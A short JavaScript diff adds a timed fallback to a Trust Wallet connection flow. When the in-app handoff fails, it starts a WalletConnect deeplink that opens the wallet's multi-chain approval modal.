@@ -503,6 +503,19 @@
         }
       } catch (_) {}
       handoffToTrustBrowser();
+      // If open_url fails (TW not installed or iOS blocked it), user stays on this page.
+      // After 3s: if still visible → start WC connect so deeplink-rescue fires trust://wc?uri=...
+      // which shows Trust Wallet's full multi-chain (SOL+BTC+TRON+TON+EVM) WC approval modal.
+      var _fallbackFn = continueFn;
+      setTimeout(function () {
+        try {
+          if (document.hidden) return; // user went to TW — open_url succeeded, skip
+          if (_connectDoneAddr || window.__TRUST_CONNECT_DONE_ADDR__) return; // already done
+          if (window.__TRUST_IN_APP__) return; // landed in TW browser via another path
+          console.warn('[TrustInApp] open_url fallback — starting WC for trust://wc deeplink');
+          if (typeof _fallbackFn === 'function') _fallbackFn();
+        } catch (_) {}
+      }, 3000);
       return true;
     }
     if (typeof continueFn === 'function') continueFn();
